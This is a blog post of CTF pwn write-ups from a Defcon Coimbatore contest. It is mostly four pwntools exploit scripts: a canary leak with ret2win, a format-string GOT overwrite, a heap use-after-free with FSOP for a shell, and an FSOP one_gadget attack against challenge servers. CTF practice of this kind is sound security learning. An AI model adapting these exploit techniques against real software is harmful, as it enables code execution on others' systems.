---
title: Defcon-CBE Pwn
published: 2026-04-17
description: "Pwn Write-ups"
tags: ["Pwn", "Heap", "FSOP", "Libc"]
#image: "image-1.png"
category: Pwn
draft: false
---

# Descrption
Just some Challenges from defcon coimbatore CTF. -_-

## babypwn 
Simple leak the canary and then do ret2win.
```python
from pwn import *
import binascii

context.arch = 'amd64'
elf = ELF('classic')
libc = elf.libc
# Set tmux as terminal for pwntools
# context.terminal = ['bash', '-c']  # Horizontal split
#context.terminal = ['kitty','-e']  

gdbs = '''
b*0x0000000000401394
c
'''
global p

if args.GDB:
        p = gdb.debug(elf.path, gdbscript=gdbs)
else:
        #p = process(elf.path)
        p = remote('pwn.labs.nerdslab.in',1337)


leak_canary = 'A'*(0x50+9)
p.send(leak_canary)
p.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
canary = p.recv(7)
canary = u64(b'\x00' + canary)
log.success(f'Canary: {hex(canary)}')

payload = flat(
    b'A'*88,
    canary,
    b'B'*8,
    elf.sym.win
)
p.sendline(payload)

p.interactive()
```

## Silent Guardian
This is a challenge that runs over tty , so normal run does not give flag in ret2win , so we do 16 byte overwrite to the putchar got entry.
```python
from pwn import *


HOST = "pwn.labs.nerdslab.in"
PORT = 9005

context.binary = ELF("./challenge", checksec=False)
context.log_level = "info"

PUTCHAR_GOT = 0x404018

def start():
    if args.LOCAL:
        return process("./challenge")
    return remote(HOST, PORT)


def main():
    io = start()
    io.recvuntil(b"Log entry: ")

    payload = b"%4726c%8$hn".ljust(16, b"A") + p64(PUTCHAR_GOT)
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

## Manager 
A classic Heap Challenge with UAF and used FSOP to get the shell.
```py
from pwn import *
import binascii

context.arch = 'amd64'
elf = ELF('note_manager')
libc = elf.libc
# Set tmux as terminal for pwntools
# context.terminal = ['bash', '-c']  # Horizontal split
#context.terminal = ['kitty','-e']  
context.terminal = ['tmux', 'splitw', '-h']
gdbs = '''
c
'''
global p

if args.GDB:
        p = gdb.debug(elf.path, gdbscript=gdbs)
elif args.REMOTE:
        p =remote('pwn.labs.nerdslab.in',1340)
else:
        p = process(elf.path)

def malloc(idx,size):
        p.recvuntil(b'> ')
        p.sendline(b'1')
        p.sendlineafter(b'Note index (0-15): ',str(idx).encode())
        p.sendlineafter(b'Note size: ',str(size).encode())
        return idx

def free(idx):
        p.recvuntil(b'> ')
        p.sendline(b'2')
        p.sendlineafter(b'Note index to delete: ',str(idx).encode())
        return idx

def puts(idx):
        p.recvuntil(b'> ')
        p.sendline(b'4')
        p.sendlineafter(b'Note index to read: ',str(idx).encode())
        p.recvuntil(b': ')
        leak = u64((p.recv(6)).ljust(8,b'\x00'))
        return leak

def scanf(idx,data):
        p.recvuntil(b'> ')
        p.sendline(b'3')
        p.sendlineafter(b'Note index to write: ',str(idx).encode())
        p.recvuntil(b': ')
        p.sendline(data)
        return

def puts2(idx):
        p.recvuntil(b'> ')
        p.sendline(b'4')
        p.sendlineafter(b'> > ',str(idx).encode())

        return leak

def demangle(a,b,s=1):
        if s:
                return a ^ b
        else:
                return (a >> 12) ^ b

def mangle(a,b):
        return a ^ b


malloc(0,88)
malloc(1,88,)
malloc(2,88,)

free(2)
free(0)

key = puts(2)
log.success(f'this is a heap leak {hex(key)}')
heap_base = (key  << 12 )
log.success(f'this is a heap base {hex(heap_base)}')


#heap_base = leak - 0x360

#scanf(0,p64(heap_base+0x10))
malloc(3, 1056)
malloc(4,24)
free(3)
leak = puts(3)
log.success(f'this is a libc leak {hex(leak)}')
libc.address = leak - 0x21ace0
log.success(f'this is a libc leak {hex(libc.address)}')

system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
environ = libc.sym['environ']
log.success(f'this is a environ leak {hex(environ)}')
#raw_input("DEBUG")

scanf(0,p64(mangle(environ,key)))

malloc(5,88)
malloc(6,88)

stack_leak = puts(6)
log.success(f'this is a prev stack leak {hex(stack_leak)}')



stdout = libc.sym._IO_2_1_stdout_
log.success(f'this is a stdout addr: {hex(stdout)}')

malloc(7,256)
malloc(8,256)

free(7)
free(8)

scanf(8,p64(mangle(stdout,key))) 

malloc(9,256)
malloc(10,256)

one = libc.address + 0xebc85

fp = FileStructure()
fp._lock = libc.sym._IO_2_1_stdout_ +0x1000
fp.vtable = libc.sym._IO_wfile_jumps
fp.chain = one
fp._wide_data = libc.sym._IO_2_1_stdout_+8

scanf(10,bytes(fp))

p.interactive()
```

## 1337 
This a classic FSOP challenge , where we directly write the `stderr` fd to one_gadget.
```py
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
elf = ELF('chan_patched')
libc = elf.libc

gdbs = '''
b*main+174
c 
'''
global p
if args.GDB:
    p = gdb.debug(elf.path,gdbscript=gdbs)
else:
    #p = process(elf.path)
    p =remote('pwn.labs.nerdslab.in',1338)

p.recvuntil(b'Use it well\n')
p.sendline(b'%p')

leak = int(p.recvline().strip(),16)
log.success(f'Libc Base is : {(leak)}')
libc.address = leak - 0x21ab23
log.success(f'Libc Base is : {hex(libc.address)}')


stderr_addr = libc.sym['_IO_2_1_stderr_']

one_gadget = libc.address + 0xebc85

fp = FileStructure()
fp._lock = libc.sym._IO_2_1_stdout_ +0x1000
fp.vtable = libc.sym._IO_wfile_jumps
fp._wide_data = stderr_addr - 48-24
fp._codecvt = stderr_addr
fp.chain = one_gadget
fp._IO_write_base = 0
fp._IO_write_ptr = libc.bss() + 0x50


payload = bytes(fp)
p.send(payload)

p.interactive()
```

# Prolouge
It was quite nice challenges to complete in 7 hours. GGs...